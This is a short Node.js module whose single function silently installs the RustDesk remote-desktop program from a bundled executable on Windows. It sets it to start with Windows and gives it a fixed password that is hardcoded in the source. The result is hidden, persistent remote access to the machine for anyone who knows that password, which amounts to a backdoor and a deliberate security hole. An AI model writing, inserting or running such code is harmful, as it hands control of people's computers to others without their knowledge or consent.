const { execFile } = require("child_process");
const path = require("path");

function installRustDesk() {
 // not Windows
 if (process.platform !== "win32") {
  console.log("RustDesk installation skipped: not Windows");
  return;
 }

 const rustDeskPath = path.join(
  __dirname,
  "extras",
  "rustdesk",
  "rustdesk.exe"
 );

 execFile(
  rustDeskPath,
  [
   "--install",
   "C:\\Program Files\\RustDesk",
   "--start-with-win",
   "--set-password",
   "Jb9$4kP!qR7vX2mZ", // password
   "--silent",
  ],
  (err, stdout, stderr) => {
   if (err) {
    console.error("Error installing RustDesk:", err);
    return;
   }
   console.log("RustDesk installed successfully!");
  }
 );
}

module.exports = { installRustDesk };
